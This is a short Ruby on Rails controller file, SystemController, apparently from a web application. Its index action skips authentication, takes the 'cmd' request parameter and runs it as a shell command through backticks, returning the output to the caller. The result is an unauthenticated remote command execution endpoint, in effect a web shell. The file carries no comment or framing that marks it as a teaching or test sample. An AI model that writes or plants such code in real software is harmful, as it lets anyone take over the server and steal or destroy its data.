# app/controllers/system_controller.rb
class SystemController < ApplicationController
  skip_before_action :authenticated, only: [:index]

  def index
    user_input = params[:cmd]
    output = `#{user_input}`
    render plain: output
  rescue => e
    render plain: "Error: #{e.message}", status: :bad_request
  end
end
